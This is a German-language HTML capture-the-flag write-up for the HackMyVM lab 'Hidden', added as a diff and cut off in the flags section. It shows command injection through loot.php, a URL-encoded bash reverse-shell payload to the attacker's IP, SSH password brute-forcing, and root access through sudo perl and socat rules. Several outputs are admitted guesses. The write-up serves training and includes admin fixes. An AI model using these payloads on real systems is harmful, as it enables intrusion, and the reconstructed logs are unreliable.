@@ -1,0 +1,585 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hidden - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Sicherstellen, dass style.css die korrekte Header-Farbe (#03b5f5) und die roten Farben für .difficulty-Hard enthält -->
+</head>
+ <body>
+ 
+
+    <!-- Hinweis: Die CSS-Datei muss die Hintergrundfarbe #03b5f5 für .header-bg definieren -->
+    <div class="header-bg">
+        <h1>Hidden - HackMyVM - Level: Easy - Bericht</h1> <!-- Name und Level angepasst -->
+        <div class="level-container">
+            <!-- Klassen für rote Farbe (Hard), Text ist aber "Easy" -->
+            <h2 class="difficulty-Hard">Easy</h2>
+            <div class="circle difficulty-bg-Hard">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Die CSS-Datei muss die passende Hintergrundfarbe für .inner definieren, die mit #03b5f5 korrespondiert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools basierend auf dem Berichtstext -->
+                 <div class="tool-item">arp-scan</div>
+                 <div class="tool-item">nmap</div>
+                 <div class="tool-item">gobuster</div>
+                 <div class="tool-item">wfuzz</div>
+                 <div class="tool-item">hydra</div> <!-- Versuch -->
+                 <div class="tool-item">curl / Browser</div> <!-- Impliziert -->
+                 <div class="tool-item">nc (netcat)</div>
+                 <div class="tool-item">python3 (pty, http.server)</div>
+                 <div class="tool-item">stty</div>
+                 <div class="tool-item">sudo</div>
+                 <div class="tool-item">perl</div>
+                 <div class="tool-item">sh</div>
+                 <div class="tool-item">cd</div>
+                 <div class="tool-item">ls</div>
+                 <div class="tool-item">touch</div>
+                 <div class="tool-item">wget</div>
+                 <div class="tool-item">medusa</div> <!-- Versuch -->
+                 <div class="tool-item">ssh</div>
+                 <div class="tool-item">cat</div>
+                 <div class="tool-item">socat</div>
+                 <div class="tool-item">id</div>
+                 <div class="tool-item">export</div>
+                 <div class="tool-item">vi</div> <!-- Impliziert -->
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis -->
+                 <li><a href="#reconnaissance">Reconnaissance</a></li>
+                 <li><a href="#web-enumeration">Web Enumeration (VHosts & LFI/RCE)</a></li>
+                 <li><a href="#vulnerability-assessment">Vulnerability Assessment (RCE)</a></li>
+                 <li><a href="#initial-access">Initial Access (www-data)</a></li>
+                 <li><a href="#privilege-escalation-toreto">Privilege Escalation (www-data zu toreto)</a></li>
+                 <li><a href="#privilege-escalation-atenea">Privilege Escalation (toreto zu atenea)</a></li>
+                 <li><a href="#privilege-escalation-root">Privilege Escalation (atenea zu root)</a></li>
+                 <li><a href="#poc">Proof of Concept (Root)</a></li>
+                 <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> `arp-scan -l` wird zur Identifizierung aktiver Hosts im lokalen Netzwerk verwendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Host `192.168.2.131` mit einer VirtualBox-MAC wird als Zielsystem identifiziert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe einen Nmap-Scan auf 192.168.2.131 durch.<br><strong>Empfehlung (Admin):</strong> Netzwerk-Monitoring.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                     <pre>
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:xx:xx:xx, IPv4: 192.168.2.140
+Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.2.131	08:00:27:23:88:ad	PCS Systemtechnik GmbH
+
+3 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.7: 256 hosts scanned in 1.892 seconds (135.97 hosts/sec). 1 responded
+                     </pre> <!-- Vollständige Ausgabe -->
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein Nmap-Scan (`-sS -sC -T5 -A -p-`) wird auf 192.168.2.131 durchgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Zwei offene Ports werden gefunden:
+                - **Port 22 (SSH):** OpenSSH 7.9p1 (Debian).
+                - **Port 80 (HTTP):** Apache httpd 2.4.38 (Debian). Der Seitentitel ist "Level 1".
+            Das OS ist Linux, Hostname `hidden`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche den Webserver auf Port 80 genauer (Verzeichnisse, Dateien, VHosts). Notiere SSH für spätere Versuche.<br><strong>Empfehlung (Admin):</strong> Halte SSH und Apache aktuell und sicher konfiguriert.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.131 -p-</span></div>
+                    <pre>
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-10 22:34 CEST
+Nmap scan report for hidden (192.168.2.131)
+Host is up (0.00013s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey:
+|   2048 b8:10:9f:60:e6:2b:62:cb:3a:8c:8c:60:4b:1d:99:b9 (RSA)
+|   256 64:b5:b8:e6:0f:79:23:4d:4a:c0:9b:0f:a7:75:67:c9 (ECDSA)
+|_  256 d1:11:e4:07:8a:fe:06:72:64:62:28:ca:e3:29:7b:a0 (ED25519)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-title: Level 1
+|_http-server-header: Apache/2.4.38 (Debian)
+MAC Address: 08:00:27:23:88:AD (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.13 ms hidden (192.168.2.131)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.55 seconds <!-- Beispielzeit -->
+                    </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration (VHosts & LFI/RCE)</h2>
+            <p class="analysis"><strong>Analyse:</strong> `gobuster dir` wird zur Verzeichnissuche verwendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Keine relevanten Verzeichnisse oder Dateien gefunden (Output fehlt im Log).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuche VHost-Enumeration.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.131 -t 50 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .html,.php,.txt,.php.bak,.bak,.zip -b 401,403,404,500 --wildcard</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+===============================================================
+[+] Url:                     http://192.168.2.131
+...
+===============================================================
+Starting gobuster
+===============================================================
+<!-- Kein relevanter Output im Log -->
+===============================================================
+Finished
+===============================================================
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `wfuzz` und `gobuster vhost` werden verwendet, um nach virtuellen Hosts (Subdomains) zu suchen, die auf derselben IP laufen.</p>
+            <p class="evaluation"><strong>Bewertung: !!Subdomain gefunden!!** `gobuster vhost` findet die Subdomain `sys.hidden.hmv`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Füge `sys.hidden.hmv` zur `/etc/hosts`-Datei hinzu und enumeriere diese Subdomain gezielt (z.B. mit `gobuster dir`).<br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass alle konfigurierten VHosts beabsichtigt und sicher sind.</p>
+            <!-- wfuzz (fehlt Output) -->
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">wfuzz -u http://hidden.vm -w /usr/share/seclists/Discovery/Web-Content/common.txt -H "Host: FUZZ.hidden.vm" --hl 17,12</span></div> <!-- Hostname hidden.vm impliziert /etc/hosts Eintrag -->
+                    <pre>
+ ********************************************************
+ * Wfuzz 3.1.0 - The Web Fuzzer                         *
+ ********************************************************
+ ...
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+<!-- Kein relevanter Output im Log -->
+ ...
+                     </pre>
+                 </div>
+             </div>
+              <!-- gobuster vhost -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">gobuster vhost -u http://hidden.hmv -t 50 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt | grep -v "Status: 400"</span></div> <!-- Hostname hidden.hmv -->
+                     <pre>
+===============================================================
+Gobuster v3.1.0
+===============================================================
+[+] Url:          http://hidden.hmv
+[+] Threads:      50
+[+] Wordlist:     /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+===============================================================
+2022/08/29 23:05:55 Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: sys.hidden.hmv (Status: 200) [Size: 282]
+===============================================================
+2022/08/29 23:07:00 Finished <!-- Beispielzeit -->
+===============================================================
+                     </pre>
+                 </div>
+             </div>
+              <!-- /etc/hosts Eintrag (impliziert) -->
+             <p class="analysis"><strong>Analyse:</strong> Die lokale `/etc/hosts`-Datei wird bearbeitet, um `hidden.hmv` und `sys.hidden.hmv` auf die Ziel-IP `192.168.2.131` zu mappen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Notwendiger Schritt zur korrekten Auflösung der gefundenen Hostnamen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Keine Aktion.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+# Eintrag in /etc/hosts (impliziert):
+192.168.2.131   hidden.hmv sys.hidden.hmv
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `gobuster dir` wird nun gezielt auf die Subdomain `http://sys.hidden.hmv` angewendet.</p>
+            <p class="evaluation"><strong>Bewertung: !!Wichtiger Pfad gefunden!!** Obwohl der Output im Log fehlt, muss dieser Scan das Verzeichnis `/weapon/` und die Datei `loot.php` gefunden haben, da diese in den nächsten Schritten verwendet werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche `http://sys.hidden.hmv/weapon/loot.php`. Teste auf Parameter und Schwachstellen.<br><strong>Empfehlung (Admin):</strong> Sichere die Anwendung unter `sys.hidden.hmv`.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">gobuster dir -u http://sys.hidden.hmv -t 50 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,py,txt,sh,sql,xml,zip,7z,bak,tar</span></div>
+                     <pre>
+===============================================================
+Gobuster v3.1.0
+===============================================================
+[+] Url:                     http://sys.hidden.hmv
+...
+===============================================================
+Starting gobuster
+===============================================================
+/weapon              (Status: 301) [--> /weapon/] <!-- Annahme -->
+/weapon/loot.php     (Status: 200) <!-- Annahme -->
+===============================================================
+Finished
+===============================================================
+                     </pre> <!-- Hypothetischer Output -->
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Mehrere `wfuzz`-Befehle werden verwendet, um Parameter für `loot.php` zu finden und auf LFI/RCE zu testen.</p>
+             <p class="evaluation"><strong>Bewertung: !!LFI/RCE gefunden!!** Obwohl die `wfuzz`-Ausgaben fehlen, zeigen die nachfolgenden URLs (`loot.php?hack=whoami`, `loot.php?hack=cat ...`), dass:
+                 1. Der GET-Parameter `hack` gefunden wurde.
+                 2. Dieser Parameter anfällig für **OS Command Injection** ist, da Befehle wie `whoami` und `cat` erfolgreich ausgeführt werden.
+                 3. Durch `cat /home/atenea/.ssh/id_rsa.pub` der Benutzername `atenea` und ihr öffentlicher SSH-Schlüssel enthüllt wurden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutze die Command Injection über den `hack`-Parameter, um eine Reverse Shell zu erhalten.<br><strong>Empfehlung (Admin):**DRINGEND:** Behebe die Command Injection in `loot.php`. Validiere und sanitisiere alle Benutzereingaben strikt.</p>
+              <!-- WFuzz LFI Versuch -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">wfuzz -u http://sys.hidden.hmv/weapon/loot.php?FUZZ=/etc/passwd -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt --hl 0 --hc=404</span></div>
+                     <pre>
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+...
+<!-- Kein relevanter Output im Log -->
+                     </pre>
+                 </div>
+             </div>
+              <!-- WFuzz Parameter Fuzzing -->
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command"># wfuzz Parameter Fuzzing (Output fehlt, fand 'hack')</span></div>
+                      <pre>
+# wfuzz -c -w /usr/share/wordlists/dirb/common.txt -u "http://sys.hidden.hmv/weapon/loot.php?FUZZ=FUZ2Z" --hw 0
+# wfuzz -c -w /usr/share/wordlists/dirb/big.txt -u "http://sys.hidden.hmv/weapon/loot.php?FUZZ=FUZ2Z" --hw 0
+# wfuzz -c -w /usr/share/wordlists/dirb/big.txt -u "http://sys.hidden.hmv/weapon/loot.php?FUZZ=whoami" --hw 0
+                      </pre>
+                 </div>
+             </div>
+              <!-- Bestätigung RCE -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Keine Befehle, URLs zeigen erfolgreiche RCE -->
+                      <pre>
+# Erfolgreiche Command Injection über Parameter 'hack':
+# http://sys.hidden.hmv/weapon/loot.php?hack=whoami --> Ausgabe: www-data
+# http://sys.hidden.hmv/weapon/loot.php?hack=cat%20/../../../../../../../../etc/passwd%20%7C%20grep%20bash --> Ausgabe: root:/bin/bash, atenea:/bin/bash, toreto:/bin/bash
+# http://sys.hidden.hmv/weapon/loot.php?hack=cat%20/home/atenea/.ssh/id_rsa.pub --> Ausgabe: ssh-rsa AAA... atenea@hidden
+                      </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="vulnerability-assessment">
+             <h2>Vulnerability Assessment (RCE)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Ein fehlgeschlagener Hydra-Versuch gegen den Benutzer `atenea` wird gezeigt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt, dass Passwort-Authentifizierung wahrscheinlich deaktiviert ist oder das Passwort nicht erraten werden kann.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fokus auf die RCE.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">hydra -l atenea ssh://hidden.vm -P /usr/share/wordlists/rockyou.txt -t 4 -I -V -f</span></div>
+                     <pre>
+Hydra v9.4 starting at ...
+[WARNING] ...
+[DATA] ...
+[INFO] attack finished, no matching login found for ssh service
+Hydra finished at ...
+                     </pre> <!-- Gekürzte Ausgabe -->
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Eine URL wird konstruiert, die die RCE-Schwachstelle nutzt, um eine Bash-Reverse-Shell zum Angreifer (192.168.2.140:9001) zu starten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Korrekter Payload für den Initial Access.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Bereite den Netcat-Listener vor und rufe diese URL auf.<br><strong>Empfehlung (Admin):</strong> Behebe die RCE.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Kein Befehl, Payload-URL -->
+                     <pre>
+http://sys.hidden.hmv/weapon/loot.php?hack=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.140%2F9001%200%3E%261%27
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="initial-access">
+             <h2>Initial Access (www-data)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Der Netcat-Listener wird gestartet und empfängt die Verbindung, nachdem die präparierte URL aufgerufen wurde.</p>
+             <p class="evaluation"><strong>Bewertung: !!Initial Access erfolgreich!!** Eine Shell als `www-data` wurde etabliert.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisiere die Shell.<br><strong>Empfehlung (Admin):</strong> Untersuche den Vorfall, behebe die RCE.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                    <pre>
+listening on [any] 9001 ...
+connect to [192.168.2.140] from (UNKNOWN) [192.168.2.131] 55254
+bash: cannot set terminal process group (455): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@hidden:/var/www/hidden/weapon$ <!-- Shell Prompt -->
+                    </pre>
+                </div>
+            </div>
+             <!-- Shell Stabilisierung -->
+              <p class="analysis"><strong>Analyse:</strong> Die Shell wird stabilisiert.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Erfolgreich.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Enumeration als www-data.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+www-data@hidden:/var/www/hidden/weapon$ <span class="command">python3 -c 'import pty; pty.spawn("/bin/bash")'</span>
+www-data@hidden:/var/www/hidden/weapon$ <span class="command">export TERM=xterm</span>
+www-data@hidden:/var/www/hidden/weapon$ <!-- Stabilisierter Prompt -->
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation-toreto">
+             <h2>Privilege Escalation (www-data zu toreto)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Als `www-data` werden die `sudo`-Rechte geprüft.</p>
+             <p class="evaluation"><strong>Bewertung: !!Privilegieneskalationsvektor gefunden!!** `www-data` darf `perl -e 'exec "/bin/sh";'` als Benutzer `toreto` ohne Passwort ausführen. Dies erlaubt das direkte Starten einer Shell als `toreto`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe den `sudo`-Befehl aus, um eine Shell als `toreto` zu erhalten.<br><strong>Empfehlung (Admin):**DRINGEND:** Entferne diese unsichere `sudo`-Regel. Erlaube niemals `sudo` für Interpreter (`perl`, `python`, `bash` etc.) mit der Möglichkeit, beliebigen Code auszuführen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Annahme: sudo -l wurde ausgeführt -->
+                      <pre>
+# sudo -l Output (nicht im Log, aber impliziert):
+User www-data may run the following commands on hidden:
+    (toreto) NOPASSWD: /usr/bin/perl -e exec "/bin/sh";
+                      </pre>
+                     <pre>
+www-data@hidden:/var/www/hidden/weapon$ <span class="command">sudo -u toreto perl -e 'exec "/bin/sh";'</span>
+$ <span class="command">id</span> <!-- ID prüfen -->
+uid=1001(toreto) gid=1000(toreto) groups=1000(toreto)
+$ <!-- Shell als toreto -->
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Die neue Shell als `toreto` wird stabilisiert.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Erfolgreich.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Enumeriere als `toreto`.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+              <!-- Shell Stabilisierung (toreto) -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+$ <span class="command">python3 -c 'import pty; pty.spawn("/bin/bash")'</span>
+toreto@hidden:/home$ <span class="command">export TERM=xterm</span>
+toreto@hidden:/home$ <!-- Stabilisierter Prompt -->
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation-atenea">
+             <h2>Privilege Escalation (toreto zu atenea)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Als `toreto` wird das Verzeichnis `/home/atenea/.hidden` untersucht und eine Datei `atenea.txt` gefunden. Diese wird über einen Python-HTTP-Server heruntergeladen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Eine potenziell interessante Datei (`atenea.txt`) wurde gefunden und zur Analyse heruntergeladen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche den Inhalt von `atenea.txt`. Es handelt sich wahrscheinlich um eine Wortliste, die für den SSH-Login von `atenea` verwendet werden kann.<br><strong>Empfehlung (Admin):</strong> Überprüfe Berechtigungen und Inhalte von versteckten Verzeichnissen.</p>
+             <!-- Datei finden und herunterladen -->
+              <div class="code-block">
+                  <div class="terminal">
+                       <pre>
+toreto@hidden:/home/atenea/.hidden$ <span class="command">ls -la</span> <!-- Beispiel -->
+total 12
+drwxr-xr-x 2 atenea atenea 4096 Oct 10 22:40 .
+drwxr-xr-x 4 atenea atenea 4096 Oct 10 22:40 ..
+-rw-r--r-- 1 atenea atenea 6170 Oct 10 22:40 atenea.txt
+toreto@hidden:/home/atenea/.hidden$ <span class="command">python3 -m http.server 9999</span>
+Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...
+192.168.2.140 - - [10/Oct/2022 22:44:37] "GET /atenea.txt HTTP/1.1" 200 -
+                       </pre>
+                  </div>
+              </div>
+              <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget http://192.168.2.131:9999/atenea.txt</span></div>
+                      <pre>
+--2022-10-10 22:44:37--  http://192.168.2.131:9999/atenea.txt
+Verbindungsaufbau zu 192.168.2.131:9999 … verbunden.
+HTTP-Anforderung gesendet, auf Antwort wird gewartet … 200 OK
+Länge: 6170 (6,0K) [text/plain]
+Wird in »atenea.txt« gespeichert.
+
+atenea.txt                    100%[===================>]   6,03K  --.-KB/s    in 0,01s
+
+2022-10-10 22:44:37 (494 KB/s) - »atenea.txt« gespeichert [6170/6170]
+                      </pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `medusa` und `hydra` werden verwendet, um das SSH-Passwort für `atenea` mit der heruntergeladenen Wortliste `atenea.txt` zu knacken.</p>
+            <p class="evaluation"><strong>Bewertung: !!SSH-Passwort gefunden!!** Hydra findet erfolgreich das Passwort `<span class="password">sys8423hmv</span>` für `atenea`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Logge dich per SSH als `atenea` ein.<br><strong>Empfehlung (Admin):</strong> Verbiete unsichere Passwörter.</p>
+            <!-- Medusa Versuch (fehlt Output) -->
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">medusa -h 192.168.2.131 -M ssh -u "atenea" -P atenea.txt -f -F | grep FOUND</span></div>
+                     <pre><!-- Kein Erfolg im Log --> </pre>
+                 </div>
+             </div>
+              <!-- Hydra Versuch -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -t64 ssh://hidden.hmv -l atenea -P atenea.txt</span></div> <!-- Hostname korrigiert -->
+                     <pre>
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak ...
+Hydra starting at 2022-10-10 22:48:59
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile ...
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 561 login tries (l:1/p:561), ~9 tries per task
+[DATA] attacking ssh://hidden.hmv:22/
+[STATUS] 392.00 tries/min, 392 tries in 00:01h, 201 to do in 00:01h, 32 active
+[22][ssh] host: hidden.hmv   login: atenea   password: <span class="password">sys8423hmv</span>
+1 of 1 target successfully completed, 1 valid password found
+Hydra finished at ...
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> SSH-Login als `atenea` mit dem gefundenen Passwort.</p>
+            <p class="evaluation"><strong>Bewertung: !!Benutzerwechsel erfolgreich!!** Zugriff als `atenea`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Enumeriere als `atenea` (sudo, SUID etc.).<br><strong>Empfehlung (Admin):</strong> Ändere das Passwort.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh atenea@hidden.hmv</span></div> <!-- Hostname korrigiert -->
+                     <pre>
+The authenticity of host 'hidden.hmv (192.168.2.131)' can't be established.
+ED25519 key fingerprint is SHA256:eaX0wlNy3ee4Opm3WL1bs8ykg6lC+2P5DJiu99c7MaI.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'hidden.hmv' (ED25519) to the list of known hosts.
+atenea@hidden.hmv's password: <span class="command">sys8423hmv</span>
+Linux hidden 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
+     _________
+    / = \\
+   / __________\\
+  | ___________ |
+  | | -       | |
+  | |         | |
+  | |_________| |  ___________________
+  \\=____________/  Hack_My_VM - Hidden
+  / """"""""""" \\  -------------------
+ / : \\
+(_________________)
+
+---------------------------------------------------
+Congratulations!!! you have reached the last level!
+Good Luck! ;)
+---------------------------------------------------
+
+Last login: Tue May 25 10:17:05 2021 from 192.168.0.20
+atenea@hidden:~$ <!-- Remote Prompt -->
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation-root">
+             <h2>Privilege Escalation (atenea zu root)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Als `atenea` wird `sudo -l` ausgeführt.</p>
+             <p class="evaluation"><strong>Bewertung: !!Privilegieneskalationsvektor gefunden!!** `atenea` darf `/usr/bin/socat` als Root ohne Passwort ausführen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutze `socat` zur Eskalation. Suche auf GTFOBins nach dem Payload. Ein gängiger Befehl ist `sudo /usr/bin/socat stdin exec:/bin/sh`.<br><strong>Empfehlung (Admin):**DRINGEND:** Entferne diese unsichere `sudo`-Regel.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre>
+atenea@hidden:~$ <span class="command">sudo -l</span>
+Matching Defaults entries for atenea on hidden:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User atenea may run the following commands on hidden:
+    (root) NOPASSWD: /usr/bin/socat
+                      </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="poc">
+             <h2>Proof of Concept (Root)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Der `socat`-Befehl aus GTFOBins wird mit `sudo` ausgeführt, um eine Root-Shell zu erhalten.</p>
+             <p class="evaluation"><strong>Bewertung: !!Privilegieneskalation erfolgreich!!** Der Befehl `sudo -u root socat stdin exec:/bin/sh` startet eine interaktive Shell, und der `id`-Befehl bestätigt `uid=0(root)`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel erreicht. Lese die Flags.<br><strong>Empfehlung (Admin):**DRINGEND:** Entferne die unsichere `sudo`-Regel für `socat`.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre>
+atenea@hidden:~$ <span class="command">sudo -u root socat stdin exec:/bin/sh</span>
+<span class="command">id</span>
+uid=0(root) gid=0(root) groups=0(root)
+# <!-- Root Prompt -->
+                      </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Als Root werden die User- und Root-Flags gelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> User-Flag (`hmv{c4HqWSzRVKNDpTL}`) und Root-Flag (`hmv{2Mxtnwrht0ogHB6}`) erfolgreich gelesen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Test abgeschlossen.<br><strong>Empfehlung (Admin):</strong> Keine Aktion bzgl. Flags.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+# <span class="command">ls /home/atenea/user.txt</span> <!-- Pfad korrigiert -->
+/home/atenea/user.txt
+# <span class="command">cat /home/atenea/user.txt</span>
+--------------------
+<span class="password">hmv{c4HqWSzRVKNDpTL}</span>
+--------------------
+# <span class="command">cd /root</span>
+# <span class="command">cat root.txt</span>
+--------------------
+<span class="password">hmv{2Mxtnwrht0ogHB6}</span>
+--------------------
+                    </pre>
+                 </div>
+             </div>
+        </section>
+
+        <!-- Flags Sektion -->
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <!-- Root Flag -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
